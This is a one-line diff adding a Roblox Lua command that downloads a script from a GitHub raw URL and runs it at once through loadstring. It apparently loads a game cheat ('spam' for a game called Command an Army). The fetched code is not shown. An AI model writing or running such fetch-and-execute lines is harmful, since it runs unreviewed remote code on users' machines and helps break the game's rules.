@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandLobsterFill/loaders/main/loaders/upd-command-an-army-spam7-lkpl1gapjf7zuo.lua"))()
